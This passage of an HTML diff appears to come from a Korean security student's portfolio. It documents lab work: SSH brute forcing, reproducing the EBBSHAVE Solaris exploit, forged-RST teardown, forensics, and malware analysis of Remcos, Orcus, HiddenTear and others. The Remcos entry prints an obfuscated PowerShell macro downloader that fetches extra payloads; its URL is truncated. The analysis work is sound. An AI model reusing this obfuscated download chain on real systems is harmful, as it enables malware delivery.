+        <div class="wuih"><span class="ft">SYSTEM</span><h3>SSH Bruteforce (Solaris)</h3><a class="anchor" href="#ssh">#ssh</a></div>
+        <p>실습망 Solaris 대상(192.168.56.102)에 Hydra로 사전 기반 SSH 접속을 시도한 기록입니다. 확인한 범위는 일부 계정 접속까지이며, root 계정 획득은 확인 범위에 포함하지 않았습니다. 대상·계정은 교육용으로 한정했고, 공개본에서는 계정 비밀번호가 보이지 않도록 명령·결과 줄을 가린 구간만 실었습니다.</p>
+        <figure class="fig"><button class="zoom" aria-label="확대: SSH 사전 공격"><img src="assets/img/ssh-01.webp" alt="Hydra로 Solaris SSH에 사전 공격을 수행하는 로그(비밀번호 구간 제외)" loading="lazy"></button><figcaption>Hydra SSH 사전 공격 수행(비밀값 제외)</figcaption></figure>
+      </article>
+      <article class="wuitem" id="it-cve3623">
+        <div class="wuih"><span class="ft">CVE-2017-3623</span><h3>CVE-2017-3623 (Solaris EBBSHAVE)</h3><a class="anchor" href="#cve3623">#cve3623</a></div>
+        <p>Solaris RPC 관련 공개 취약점(EBBSHAVE) PoC를 받아 실습망 Solaris 대상(192.168.56.104)에 적용했습니다. 익스플로잇이 주소를 맞춰 가며 시도한 끝에 대상에서 <code class="inl">/bin/sh</code> 연결까지 확인했습니다. 신규 취약점 발견이 아니라 공개 PoC를 교육용 사설망 조건에 맞춰 재현한 기록입니다.</p>
+        <div class="figrow two">
+          <figure class="fig"><button class="zoom" aria-label="확대: EBBSHAVE 실행"><img src="assets/img/cve3623-02.webp" alt="EBBSHAVE 익스플로잇이 Solaris 대상에 시도하는 화면" loading="lazy"></button><figcaption>EBBSHAVE 익스플로잇 시도</figcaption></figure>
+          <figure class="fig"><button class="zoom" aria-label="확대: 셸 연결"><img src="assets/img/cve3623-03.webp" alt="익스플로잇 결과 대상에서 /bin/sh 연결 확인" loading="lazy"></button><figcaption>대상에서 /bin/sh 연결 확인</figcaption></figure>
+        </div>
+      </article>
+      <article class="wuitem" id="it-tcpclose">
+        <div class="wuih"><span class="ft">TCP</span><h3>TCP 연결 종료 실습</h3><a class="anchor" href="#tcpclose">#tcpclose</a></div>
+        <p>캡처로 Seq/Ack를 확인한 뒤 변조 RST 패킷을 보내 TCP 연결을 강제 종료하는 것을 확인했습니다. 확인한 범위는 연결 종료까지이며, 세션 탈취나 평문 데이터 변조로 이어지는 것은 아닙니다.</p>
+        <figure class="fig"><button class="zoom" aria-label="확대: TCP 종료"><img src="assets/img/sess-04.webp" alt="변조 RST TCP 연결 종료" loading="lazy"></button><figcaption>변조 RST에 의한 연결 종료</figcaption></figure>
+      </article>
+      <article class="wuitem" id="it-sshtunnel">
+        <div class="wuih"><span class="ft">과제</span><h3>SSH 터널링 과제</h3><a class="anchor" href="#sshtunnel">#sshtunnel</a></div>
+        <p>SSH 로컬 포트 포워딩으로 직접 접근하기 어려운 내부 서비스에 접근 경로를 구성한 학습 과제입니다. 아래 명령은 로컬 8080 포트를 원격 호스트의 8080으로 포워딩해, 로컬에서 원격 서비스에 접근하도록 터널을 연 것입니다. 이 페이지에는 캡처가 없어 실행한 명령으로 대신합니다.</p>
+        <div class="term"><div class="bar"><b>호스트 PC SSH 로컬 포트 포워딩</b><span>COMMAND</span></div><div class="body"><pre>ssh -L 8080:localhost:8080 sch@192.168.0.232</pre></div></div>
+      </article>
+      <article class="wuitem" id="it-lindiag">
+        <div class="wuih"><span class="ft">진단 · 수업</span><h3>리눅스·윈도우 취약점 진단</h3><a class="anchor" href="#lindiag">#lindiag</a></div>
+        <p>진단 항목을 셸 스크립트로 점검하는 수업 실습입니다. 화면은 <code class="inl">/etc/shadow</code> 존재 여부를 <code class="inl">if test -f</code>로 점검하는 스크립트로, 파일·설정 상태를 조건으로 판정하는 진단 스크립트의 기본 형태입니다. 제공된 예제를 바탕으로 직접 작성·수정한 범위와 그대로 사용한 예제를 구분해 기록했으며, 완성된 통합 진단 스크립트 공개는 로드맵의 예정 항목으로 둡니다.</p>
+        <figure class="fig"><button class="zoom" aria-label="확대: 진단 스크립트"><img src="assets/img/lindiag-23.webp" alt="shadow 파일 존재 여부를 점검하는 진단 셸 스크립트" loading="lazy"></button><figcaption>shadow 파일 존재 점검 스크립트</figcaption></figure>
+      </article>
+      <article class="wuitem" id="it-openedr">
+        <div class="wuih"><span class="ft">소스 분석</span><h3>OpenEDR 소스 분석</h3><a class="anchor" href="#openedr">#openedr</a></div>
+        <p>오픈소스 EDR 코드를 읽으며 탐지에 쓰이는 구성 요소가 어떻게 연결되는지 구조 중심으로 정리했습니다. 이 페이지는 소스 구조 메모라 캡처가 없어, 분석한 구성 요소를 아래와 같이 정리합니다. 이 분석이 개인 프로젝트 <a href="#miniedr" style="color:var(--fg)">miniEDR</a>의 탐지·격리 설계 배경이 되었습니다.</p>
+        <div class="flow" style="margin-top:14px">
+          <div class="f"><span class="n">커널 콜백</span><span class="t">프로세스·스레드·이미지 로드 등 커널 이벤트를 콜백으로 수집</span></div>
+          <div class="f"><span class="n">레지스트리</span><span class="t">Pre/Post 콜백으로 레지스트리 변경을 감시</span></div>
+          <div class="f"><span class="n">미니필터</span><span class="t">파일시스템 I/O를 필터 드라이버 계층에서 관찰</span></div>
+          <div class="f"><span class="n">서비스 흐름</span><span class="t">수집된 이벤트가 사용자 영역 서비스로 전달·처리되는 경로</span></div>
+        </div>
+      </article>
+      <p class="wupnote">* 사설망 연계 침투(웹쉘 → 권한 상승 → C2)의 보조 캡처(bpf-15/22/27)는 공개 취약점 재현 맥락의 참고 자료로, 개별 항목으로 분리하지 않고 본 목록의 RPC·시스템 항목으로 대표했습니다. 모든 대상은 교육용 사설망이며 비밀값은 마스킹했습니다.</p>
+      <div style="margin-top:26px;display:flex;gap:10px;flex-wrap:wrap"><a class="btn" href="#writeups">← 실습·분석 목록</a><a class="btn" href="#home">홈</a></div>
+    </div>
+  </section>
+</div>
+
+<!-- ===================== NETWORK / 관제 ===================== -->
+<div class="view" id="view-network" hidden>
+  <section>
+    <div class="wrap">
+      <nav class="crumb" aria-label="위치"><a href="#home">홈</a><span class="sep">/</span><a href="#writeups">실습·분석</a><span class="sep">/</span><span>네트워크·관제</span></nav>
+      <h1 class="dtitle" tabindex="-1">네트워크·관제 실습</h1>
+      <p class="dsum">네트워크 장비 구성, 보안 이벤트 수집·관제, 패킷 분석을 실습한 기록입니다. 각 항목은 목록에서 바로 이동할 수 있도록 고유 위치를 가지며, 확인한 범위를 구분해 기재합니다.</p>
+      <div class="meta">
+        <div class="m"><div class="mk">수행 유형</div><div class="mv">교육 실습(사설망)</div></div>
+        <div class="m"><div class="mk">도구</div><div class="mv">pfSense · Suricata · Elastic · Wireshark</div></div>
+        <div class="m"><div class="mk">성격</div><div class="mv">구성 · 수집 · 분석</div></div>
+        <div class="m"><div class="mk">공개 처리</div><div class="mv">식별 정보 마스킹</div></div>
+      </div>
+
+      <article class="wuitem" id="it-pfsense">
+        <div class="wuih"><span class="ft">관제</span><h3>pfSense 구성·정책</h3><a class="anchor" href="#pfsense">#pfsense</a></div>
+        <p>pfSense 방화벽을 콘솔에서 WAN/LAN 인터페이스와 IP(사설망)로 구성하고, 웹 관리자에서 LAN 방화벽 규칙을 직접 만들고 편집했습니다. 화면은 규칙 목록과 규칙 편집 화면으로, 장비·정책 구성까지가 확인 범위입니다.</p>
+        <div class="figrow two">
+          <figure class="fig"><button class="zoom" aria-label="확대: 방화벽 규칙"><img src="assets/img/pfsense-07.webp" alt="pfSense LAN 방화벽 규칙 목록" loading="lazy"></button><figcaption>LAN 방화벽 규칙 목록</figcaption></figure>
+          <figure class="fig"><button class="zoom" aria-label="확대: 규칙 편집"><img src="assets/img/pfsense-08.webp" alt="pfSense 방화벽 규칙 편집 화면" loading="lazy"></button><figcaption>방화벽 규칙 편집</figcaption></figure>
+        </div>
+      </article>
+      <article class="wuitem" id="it-elastic">
+        <div class="wuih"><span class="ft">관제</span><h3>Elastic Stack 수집 구성</h3><a class="anchor" href="#elastic">#elastic</a></div>
+        <p>Suricata를 NFQUEUE 연동으로 빌드·구성해 엔진을 기동하고, 이벤트가 Filebeat·Logstash를 거쳐 Elasticsearch로 수집되는 파이프라인을 구성했습니다. 화면은 Suricata의 NFQueue 지원 확인과 엔진 기동 로그로, 수집 파이프라인 구성까지가 확인 범위인 통합 관제(ELK) 실습입니다.</p>
+        <div class="figrow two">
+          <figure class="fig"><button class="zoom" aria-label="확대: NFQueue 지원"><img src="assets/img/elastic-03.webp" alt="Suricata 빌드 구성에서 NFQueue support: yes 확인" loading="lazy"></button><figcaption>Suricata NFQueue 지원 확인</figcaption></figure>
+          <figure class="fig"><button class="zoom" aria-label="확대: 엔진 기동"><img src="assets/img/elastic-04.webp" alt="Suricata 7.0.4 엔진이 기동된 로그" loading="lazy"></button><figcaption>Suricata 엔진 기동 로그</figcaption></figure>
+        </div>
+      </article>
+      <article class="wuitem" id="it-packet">
+        <div class="wuih"><span class="ft">패킷</span><h3>패킷 분석 — ARP · FTP · DDoS</h3><a class="anchor" href="#packet">#packet</a></div>
+        <p>캡처한 트래픽을 프로토콜별로 나눠 ARP 스푸핑 흔적, 평문 FTP 자격증명 노출, 대량 요청 기반 DDoS 패턴을 구분해 분석했습니다. 캡처가 보여주는 범위로 한정했습니다.</p>
+        <div class="figrow two">
+          <figure class="fig"><button class="zoom" aria-label="확대: 패킷 분석 1"><img src="assets/img/packet-03.webp" alt="프로토콜별 패킷 분석 화면" loading="lazy"></button><figcaption>프로토콜별 트래픽 분석</figcaption></figure>
+          <figure class="fig"><button class="zoom" aria-label="확대: 패킷 분석 2"><img src="assets/img/packet-08.webp" alt="공격 트래픽 패턴 분석" loading="lazy"></button><figcaption>공격 트래픽 패턴</figcaption></figure>
+        </div>
+      </article>
+      <article class="wuitem" id="it-nitroba">
+        <div class="wuih"><span class="ft">과제</span><h3>Nitroba 패킷 분석 과제</h3><a class="anchor" href="#nitroba">#nitroba</a></div>
+        <p>공개 교육용 캡처(Nitroba)에서 <code class="inl">http.request.method==POST</code> 필터로 특정 단서를 포함한 요청만 추려 용의자의 활동 흐름을 재구성한 과제입니다. 화면은 필터로 좁힌 POST 요청 목록이며, 캡처에 포함된 인물 식별 정보(이메일 등)는 공개본에서 본문 상세를 제외해 가렸습니다.</p>
+        <figure class="fig"><button class="zoom" aria-label="확대: Nitroba 필터링"><img src="assets/img/nitroba-00.webp" alt="HTTP POST 필터로 추린 요청 목록(개인정보 상세 제외)" loading="lazy"></button><figcaption>HTTP POST 필터로 단서 추적(개인정보 제외)</figcaption></figure>
+      </article>
+      <div style="margin-top:26px;display:flex;gap:10px;flex-wrap:wrap"><a class="btn" href="#writeups">← 실습·분석 목록</a><a class="btn" href="#home">홈</a></div>
+    </div>
+  </section>
+</div>
+
+<!-- ===================== FORENSIC / 침해사고 ===================== -->
+<div class="view" id="view-forensic" hidden>
+  <section>
+    <div class="wrap">
+      <nav class="crumb" aria-label="위치"><a href="#home">홈</a><span class="sep">/</span><a href="#writeups">실습·분석</a><span class="sep">/</span><span>침해사고·포렌식</span></nav>
+      <h1 class="dtitle" tabindex="-1">침해사고·포렌식 실습</h1>
+      <p class="dsum">침해 흔적 분석과 포렌식 아티팩트 추출, 분석 환경 구축을 실습한 기록입니다. 각 항목은 고유 위치를 가지며, 강의에서 제공된 자료와 직접 수행한 분석을 구분해 기재합니다.</p>
+      <div class="meta">
+        <div class="m"><div class="mk">수행 유형</div><div class="mv">교육 실습</div></div>
+        <div class="m"><div class="mk">도구</div><div class="mv">FTK · 로그 분석 · Cuckoo</div></div>
+        <div class="m"><div class="mk">성격</div><div class="mv">흔적 분석 · 타임라인 · 환경 구축</div></div>
+        <div class="m"><div class="mk">출처 표기</div><div class="mv">제공 자료 구분</div></div>
+      </div>
+
+      <article class="wuitem" id="it-dbd">
+        <div class="wuih"><span class="ft">침해 분석</span><h3>DBD 침해 분석 1·2</h3><a class="anchor" href="#dbd">#dbd</a></div>
+        <p>드라이브-바이 다운로드 침해 시나리오에서 감염 페이지의 난독화된 악성 JavaScript를 확인하고, 브라우저 캐시(임시 인터넷 파일)에 남은 다운로드 출처 IP·시간·파일을 연결했습니다. 확인한 범위는 캐시·로그 아티팩트로 재구성한 타임라인까지입니다.</p>
+        <div class="figrow two">
+          <figure class="fig"><button class="zoom" aria-label="확대: 악성 스크립트"><img src="assets/img/dbd-02.webp" alt="감염 페이지의 난독화된 악성 자바스크립트" loading="lazy"></button><figcaption>난독화된 악성 JavaScript</figcaption></figure>
+          <figure class="fig"><button class="zoom" aria-label="확대: 캐시 아티팩트"><img src="assets/img/dbd-04.webp" alt="브라우저 캐시에 남은 악성 스크립트 다운로드 출처와 시간" loading="lazy"></button><figcaption>캐시의 다운로드 출처·시간 단서</figcaption></figure>
+        </div>
+      </article>
+      <article class="wuitem" id="it-deface">
+        <div class="wuih"><span class="ft">침해 분석</span><h3>Deface 침해 분석</h3><a class="anchor" href="#deface">#deface</a></div>
+        <p>웹 페이지 변조(deface) 사건에서 공격자 명령 이력(다운로더 내려받기·계정 생성 등)과 변조된 WordPress PHP 파일을 시간 기준으로 찾아 타임라인을 정리했습니다. 화면은 공격자 bash 이력과 변경 시각으로 추린 <code class="inl">*.php</code> 목록입니다. 첨부된 분석 보고서 형식 자료는 강의에서 제공된 것으로, 본인 작성 분석과 구분해 출처를 표기합니다.</p>
+        <div class="figrow two">
+          <figure class="fig"><button class="zoom" aria-label="확대: 공격자 명령 이력"><img src="assets/img/deface-02.webp" alt="침해 호스트의 bash 명령 이력에서 공격자 활동 재구성" loading="lazy"></button><figcaption>공격자 명령 이력 재구성</figcaption></figure>
+          <figure class="fig"><button class="zoom" aria-label="확대: 변조 파일"><img src="assets/img/deface-08.webp" alt="변경 시각 기준으로 찾은 변조 PHP 파일 목록" loading="lazy"></button><figcaption>변경 시각 기준 변조 파일 탐색</figcaption></figure>
+        </div>
+      </article>
+      <article class="wuitem" id="it-ftk">
+        <div class="wuih"><span class="ft">포렌식</span><h3>FTK 분석 실습</h3><a class="anchor" href="#ftk">#ftk</a></div>
+        <p>FTK Imager로 NTFS 이미지를 열어 <code class="inl">$MFT</code>·<code class="inl">$LogFile</code>·<code class="inl">$UsnJrnl($J)</code> 같은 파일시스템 아티팩트를 추출하고, 파일의 시간 정보(MAC time)를 대조하는 포렌식 기본기를 실습했습니다. 도구 사용과 아티팩트 확인까지가 범위입니다.</p>
+        <div class="figrow two">
+          <figure class="fig"><button class="zoom" aria-label="확대: FTK 아티팩트"><img src="assets/img/ftk-02.webp" alt="FTK Imager로 NTFS 메타파일($MFT·$LogFile) 확인" loading="lazy"></button><figcaption>NTFS 메타파일 아티팩트 확인</figcaption></figure>
+          <figure class="fig"><button class="zoom" aria-label="확대: 시간 정보"><img src="assets/img/ftk-04.webp" alt="$J·$LogFile·$MFT의 시간 정보 대조" loading="lazy"></button><figcaption>아티팩트 시간 정보 대조</figcaption></figure>
+        </div>
+      </article>
+      <article class="wuitem" id="it-driveby">
+        <div class="wuih"><span class="ft">침해 분석</span><h3>드라이브-바이 실습</h3><a class="anchor" href="#driveby">#driveby</a></div>
+        <p>공개 PoC(CVE-2016-0189, IE VBScript)를 받아, 숨김 iframe으로 악성 페이지를 불러오고 다운로드·실행 스크립트로 이어지는 드라이브-바이 흐름을 교육 시나리오에서 재현했습니다. 화면은 PoC 저장소와 삽입된 악성 iframe으로, DBD 침해 분석의 증거 해석과 연결해 보았습니다. 교육용 시나리오로 한정했습니다.</p>
+        <div class="figrow two">
+          <figure class="fig"><button class="zoom" aria-label="확대: PoC 준비"><img src="assets/img/driveby-00.webp" alt="드라이브-바이 공개 PoC 저장소를 받는 화면" loading="lazy"></button><figcaption>공개 PoC 준비</figcaption></figure>
+          <figure class="fig"><button class="zoom" aria-label="확대: 악성 iframe"><img src="assets/img/driveby-02.webp" alt="숨김 iframe으로 악성 페이지를 불러오는 스크립트" loading="lazy"></button><figcaption>숨김 iframe 삽입</figcaption></figure>
+        </div>
+      </article>
+      <article class="wuitem" id="it-cuckoo">
+        <div class="wuih"><span class="ft">환경 구축</span><h3>Cuckoo 샌드박스 구축</h3><a class="anchor" href="#cuckoo">#cuckoo</a></div>
+        <p>악성코드 자동 분석을 위한 Cuckoo 샌드박스를 분석용 VM·스냅샷·에이전트 연동까지 구축하고, 구축 과정에서 생긴 설정·연동 문제를 직접 해결했습니다. 확인한 범위는 샌드박스 동작 확인까지입니다.</p>
+        <figure class="fig"><button class="zoom" aria-label="확대: Cuckoo 구축"><img src="assets/img/cuckoo-80.webp" alt="Cuckoo 샌드박스 분석 환경 화면" loading="lazy"></button><figcaption>Cuckoo 분석 환경 구성</figcaption></figure>
+      </article>
+      <article class="wuitem" id="it-hyper">
+        <div class="wuih"><span class="ft">환경 구축</span><h3>하이퍼바이저·분석 환경</h3><a class="anchor" href="#hyper">#hyper</a></div>
+        <p>가상화를 활성화한 분석용 VM에서 자동 업데이트·방화벽·실시간 보호 등을 꺼 샘플 실행에 영향을 주지 않도록 격리 환경을 구성했습니다. 화면은 가상화 사용 상태와 보호 기능을 끈 보안 설정으로, 직접 설정한 범위를 정리한 구축 기록입니다.</p>
+        <div class="figrow two">
+          <figure class="fig"><button class="zoom" aria-label="확대: 가상화 활성"><img src="assets/img/hyper-00.webp" alt="작업 관리자에서 가상화 사용 상태 확인" loading="lazy"></button><figcaption>가상화 사용 상태</figcaption></figure>
+          <figure class="fig"><button class="zoom" aria-label="확대: 보호 기능 해제"><img src="assets/img/hyper-05.webp" alt="분석 환경을 위해 보호 기능을 끈 Windows 보안 설정" loading="lazy"></button><figcaption>분석용 보호 기능 해제</figcaption></figure>
+        </div>
+      </article>
+      <article class="wuitem" id="it-recon">
+        <div class="wuih"><span class="ft">IR 수집</span><h3>IR 아티팩트 수집 (Windows·Linux)</h3><a class="anchor" href="#recon">#recon</a></div>
+        <p>침해사고 대응을 위해 Windows·Linux 대상에서 시스템 정보를 자동 수집하는 스크립트를 실행하고, 수집된 아티팩트가 분류별 폴더로 정리되는 것을 확인했습니다. 화면은 Windows IR 수집 실행과 Linux IR 수집 스크립트 실행으로, 수집 자동화와 산출물 확인까지가 범위입니다.</p>
+        <div class="figrow two">
+          <figure class="fig"><button class="zoom" aria-label="확대: Windows IR 수집"><img src="assets/img/recon-01.webp" alt="Windows IR 수집 스크립트 실행과 산출 디렉터리" loading="lazy"></button><figcaption>Windows IR 아티팩트 수집</figcaption></figure>
+          <figure class="fig"><button class="zoom" aria-label="확대: Linux IR 수집"><img src="assets/img/recon-04.webp" alt="Linux IR 수집 스크립트 실행 로그" loading="lazy"></button><figcaption>Linux IR 아티팩트 수집</figcaption></figure>
+        </div>
+      </article>
+      <div style="margin-top:26px;display:flex;gap:10px;flex-wrap:wrap"><a class="btn" href="#writeups">← 실습·분석 목록</a><a class="btn" href="#home">홈</a></div>
+    </div>
+  </section>
+</div>
+
+<!-- ===================== MALWARE ===================== -->
+<div class="view" id="view-malware" hidden>
+  <section>
+    <div class="wrap">
+      <nav class="crumb" aria-label="위치"><a href="#home">홈</a><span class="sep">/</span><a href="#writeups">실습·분석</a><span class="sep">/</span><span>악성코드 분석</span></nav>
+      <h1 class="dtitle" tabindex="-1">악성코드 정적·동적 분석</h1>
+      <p class="dsum">제공 샘플을 분석 환경에서 정적·동적으로 분석했습니다. 캡션은 각 화면이 보여주는 범위로 제한하고, 자동 도구 판정과 본인 해석, 성공·실패를 구분합니다. 일부 값은 공개본에서 가렸습니다.</p>
+      <div class="meta">
+        <div class="m"><div class="mk">수행 유형</div><div class="mv">교육 실습 · 제공 샘플</div></div>
+        <div class="m"><div class="mk">도구</div><div class="mv">DIE · Sysinternals · Volatility · FTK</div></div>
+        <div class="m"><div class="mk">구분</div><div class="mv">자동 판정 ↔ 본인 해석</div></div>
+        <div class="m"><div class="mk">공개 처리</div><div class="mv">일부 값 마스킹</div></div>
+      </div>
+      <p class="wuplede" style="margin-top:18px">각 샘플은 목록에서 바로 이동할 수 있도록 고유 위치를 가집니다. 캡처가 있는 항목은 화면이 보여주는 범위로, 짧은 항목은 분석에서 직접 확인한 관찰을 중심으로 정리했습니다.</p>
+
+      <article class="wuitem" id="it-m518">
+        <div class="wuih"><span class="ft">대표 · 지속성</span><h3>518.exe 정적·동적 분석</h3><a class="anchor" href="#m518">#m518</a></div>
+        <p>정적 분석(DIE/pestudio)으로 PE 구조를 확인한 뒤, 동적 분석에서 자동실행 등록을 두 도구로 대조했습니다. <b>확인하려 한 것</b> — 샘플이 재부팅 후에도 실행되도록 등록되는지. <b>화면에서 본 것</b> — Autoruns 자동실행 목록에 518.exe가 올라왔고, Regshot 전후 비교에서도 같은 <code class="inl">HKLM\...\CurrentVersion\Run</code> 키 값(518.exe)이 새로 추가됐습니다. <b>판단</b> — 두 도구가 동일한 자동실행 등록(Run 키 → 518.exe)을 보여줘, 레지스트리 Run 키를 통한 지속성으로 판단했습니다.</p>
+        <div class="figrow three" style="margin-top:4px">
+          <figure class="fig"><button class="zoom" aria-label="확대: PE 구조"><img src="assets/img/m518-00.webp" alt="DIE로 518.exe PE 구조·지표 확인" loading="lazy"></button><figcaption>정적 — PE 구조 확인(DIE)</figcaption></figure>
+          <figure class="fig"><button class="zoom" aria-label="확대: Autoruns"><img src="assets/img/m518-21.webp" alt="Autoruns 자동실행 목록에 518.exe가 등록됨" loading="lazy"></button><figcaption>Autoruns — 자동실행에 518.exe</figcaption></figure>
+          <figure class="fig"><button class="zoom" aria-label="확대: Regshot"><img src="assets/img/m518-34.webp" alt="Regshot 전후 비교에서 Run 키에 518.exe 값이 새로 추가됨" loading="lazy"></button><figcaption>Regshot — Run 키에 518.exe 값 추가</figcaption></figure>
+        </div>
+      </article>
+      <article class="wuitem" id="it-beast">
+        <div class="wuih"><span class="ft">RAT</span><h3>BeastDoor</h3><a class="anchor" href="#beast">#beast</a></div>
+        <p>프로세스 생성 관계를 추적해 샘플 실행 후의 프로세스 트리를 확인했습니다. 화면에서 본 범위는 프로세스 관계까지이며, 네트워크·파일 행위 등 추가 결과는 실제 API 반환·캡처를 근거로 구분합니다.</p>
+        <figure class="fig"><button class="zoom" aria-label="확대: 프로세스 트리"><img src="assets/img/beast-11.webp" alt="프로세스 트리" loading="lazy"></button><figcaption>프로세스 트리 관찰</figcaption></figure>
+      </article>
+      <article class="wuitem" id="it-clickfix">
+        <div class="wuih"><span class="ft">메모리</span><h3>ClickFix 메모리 포렌식</h3><a class="anchor" href="#clickfix">#clickfix</a></div>
+        <p>메모리 덤프를 Volatility로 분석해 의심 문자열, 프로세스 인젝션 흔적, 외부 연결과 지속성 단서를 연결했습니다. 확인한 범위는 메모리에서 관찰 가능한 아티팩트까지입니다.</p>
+        <figure class="fig"><button class="zoom" aria-label="확대: 메모리"><img src="assets/img/clickfix-06.webp" alt="Volatility 메모리 분석" loading="lazy"></button><figcaption>Volatility 메모리 분석</figcaption></figure>
+      </article>
+      <article class="wuitem" id="it-wanna">
+        <div class="wuih"><span class="ft">랜섬</span><h3>WannaCry 침해 분석</h3><a class="anchor" href="#wanna">#wanna</a></div>
+        <p>FTK로 디스크 이미지를 열어 레지스트리·캐시·서비스 등 감염 흔적 아티팩트를 확인했습니다. 암호화 동작 자체의 재현이 아니라 침해 이후 디스크에 남은 흔적을 정리한 포렌식 기록입니다.</p>
+        <figure class="fig"><button class="zoom" aria-label="확대: FTK"><img src="assets/img/wanna-05.webp" alt="FTK 디스크 분석" loading="lazy"></button><figcaption>FTK 디스크 포렌식</figcaption></figure>
+      </article>
+      <article class="wuitem" id="it-htear">
+        <div class="wuih"><span class="ft">랜섬</span><h3>HiddenTear</h3><a class="anchor" href="#htear">#htear</a></div>
+        <p>암호화 키가 외부로 전송되는 구조를 분석하고, 확보한 키로 암호화된 파일을 복호화해 복원되는 것까지 확인했습니다. 키·토큰 등 비밀값은 공개본에서 실제 픽셀로 가렸습니다.</p>
+        <figure class="fig"><button class="zoom" aria-label="확대: 복호화"><img src="assets/img/htear-08.webp" alt="복호화 확인, 키 마스킹" loading="lazy"></button><figcaption>복호화 확인(값 마스킹)</figcaption></figure>
+      </article>
+      <article class="wuitem" id="it-remcos">
+        <div class="wuih"><span class="ft">RAT</span><h3>Remcos</h3><a class="anchor" href="#remcos">#remcos</a></div>
+        <p>원문 기록이 짧은 샘플로, 캡처 대신 그 안에서 직접 확인한 난독화 명령을 코드로 싣습니다. 감염 문서의 매크로가 PowerShell을 호출하는데, 문자열을 잘게 쪼개 이어 붙이고 역따옴표(<code class="inl">I`E`X</code>)와 <code class="inl">IEX</code>로 난독화한 뒤 <code class="inl">Net.WebClient.DownloadString</code>으로 추가 악성코드(실습 기준 3개)를 내려받는 구조였습니다. 전체 행위 체계가 아니라 확인된 지표 중심의 메모임을 밝혀 둡니다.</p>
+        <div class="term"><div class="bar"><b>감염 문서 매크로 → PowerShell 다운로더</b><span>OBFUSCATED</span></div><div class="body"><pre>'...LoadWi'+'thPartialName(''Microsoft.VisualBasic'')' | IEX ;
+$t56fg = [Enum]::ToObject([Net.SecurityProtocolType], 3072) ;      # TLS 1.2 강제
+do { $ping = test-connection -comp google.com -count 1 -Quiet } until ($ping) ;
+$tty = '(New-'+'Obje'+'ct Ne'+'t.We'+'bCli'+'ent)' | I`E`X ;       # 문자열 분할 + IEX
+[Microsoft.VisualBasic.Interaction]::CallByname(
+    $tty, 'DownloadString', [..]::Method, 'http'+'://…' ) ;        # 추가 페이로드 수신</pre></div></div>
+      </article>
+      <article class="wuitem" id="it-orcus">
+        <div class="wuih"><span class="ft">RAT</span><h3>Orcus</h3><a class="anchor" href="#orcus">#orcus</a></div>
+        <p>격리된 교육 환경에서 Orcus 클라이언트 빌더 설정을 확인했습니다. 키로거 활성화, 관리자 권한 강제, 설치 프롬프트 숨김·자동 시작·생성 시각 변조 같은 은폐·지속성 옵션이 어떻게 구성되는지 관찰 중심으로 정리했습니다. 확인 가능한 범위로 한정한 기록입니다.</p>
+        <div class="figrow two">
+          <figure class="fig"><button class="zoom" aria-label="확대: 클라이언트 빌더"><img src="assets/img/orcus-06.webp" alt="Orcus 클라이언트 빌더의 키로거·권한 설정" loading="lazy"></button><figcaption>키로거·권한 설정</figcaption></figure>
+          <figure class="fig"><button class="zoom" aria-label="확대: 설치 옵션"><img src="assets/img/orcus-08.webp" alt="설치 프롬프트 숨김·자동 시작·생성 시각 변조 옵션" loading="lazy"></button><figcaption>은폐·지속성 설치 옵션</figcaption></figure>
+        </div>
+      </article>
+      <article class="wuitem" id="it-badusb">
+        <div class="wuih"><span class="ft">장치</span><h3>BadUSB</h3><a class="anchor" href="#badusb">#badusb</a></div>
+        <p>Arduino Leonardo 보드를 HID(키보드)로 인식시키는 스케치를 작성·업로드해, 장치가 꽂히면 미리 정의한 입력이 자동 실행되는 과정을 확인했습니다. 화면은 보드를 Leonardo로 지정한 설정과 COM 포트로 업로드가 완료된 결과이며, 장치 신뢰·입력 제어 관점의 방어 포인트를 함께 정리했습니다. 교육용 장치·환경으로 한정한 실습입니다.</p>
+        <div class="figrow two">
+          <figure class="fig"><button class="zoom" aria-label="확대: Leonardo 보드 선택"><img src="assets/img/badusb-03.webp" alt="Arduino IDE에서 보드를 Arduino Leonardo로 선택" loading="lazy"></button><figcaption>HID 보드(Leonardo) 지정</figcaption></figure>
+          <figure class="fig"><button class="zoom" aria-label="확대: 업로드 완료"><img src="assets/img/badusb-04.webp" alt="COM3의 Arduino Leonardo로 스케치 업로드 완료" loading="lazy"></button><figcaption>COM 포트로 업로드 완료</figcaption></figure>
+        </div>
+      </article>
+      <article class="wuitem" id="it-banker">
+        <div class="wuih"><span class="ft">Banker</span><h3>Banker 분석</h3><a class="anchor" href="#banker">#banker</a></div>
+        <p>금융정보 탈취형 샘플을 정적 분석했습니다. 해시로 VirusTotal에서 다수 벤더 탐지를 확인하고, DIE로 PE 구조와 패킹(높은 엔트로피·EP의 pushal) 흔적을 식별했습니다. 화면은 해시·VT 탐지와 패킹 판정으로, 샘플 식별·정적 분석까지가 확인 범위입니다.</p>
+        <div class="figrow two">
+          <figure class="fig"><button class="zoom" aria-label="확대: 해시·VT"><img src="assets/img/banker-02.webp" alt="샘플 해시와 VirusTotal 다수 탐지 확인" loading="lazy"></button><figcaption>해시·VirusTotal 탐지</figcaption></figure>
+          <figure class="fig"><button class="zoom" aria-label="확대: 패킹 판정"><img src="assets/img/banker-04.webp" alt="DIE로 압축·패킹된 PE 구조 판정" loading="lazy"></button><figcaption>DIE 패킹 판정</figcaption></figure>
+        </div>
+      </article>
+      <article class="wuitem" id="it-installlmp">
+        <div class="wuih"><span class="ft">드로퍼</span><h3>Install_LiveManagerPlayer.exe</h3><a class="anchor" href="#installlmp">#installlmp</a></div>
+        <p>WinRAR SFX 드로퍼 샘플을 분석했습니다. 압축 안에 CONFIG.INI·HDSetup.exe 등을 담아 조용히(Silent) 설치하도록 구성돼 있었고, IDA로 본 WinMain에서는 <code class="inl">kbstar.com</code> 등 국내 은행 도메인을 다루는 명령 문자열을 확인했습니다(파밍형 정황). 화면은 SFX 내용물·설치 스크립트와 IDA 디컴파일 결과로, 설치 구성·문자열 확인까지가 범위입니다.</p>
+        <div class="figrow two">
+          <figure class="fig"><button class="zoom" aria-label="확대: SFX 내용물"><img src="assets/img/installlmp-01.webp" alt="WinRAR SFX 드로퍼의 내용물과 조용한 설치 스크립트" loading="lazy"></button><figcaption>SFX 드로퍼 구성·설치 스크립트</figcaption></figure>
+          <figure class="fig"><button class="zoom" aria-label="확대: IDA 분석"><img src="assets/img/installlmp-08.webp" alt="IDA WinMain에서 은행 도메인 문자열을 다루는 코드" loading="lazy"></button><figcaption>IDA — 은행 도메인 문자열</figcaption></figure>
+        </div>
+      </article>
+      <article class="wuitem" id="it-livemanager">
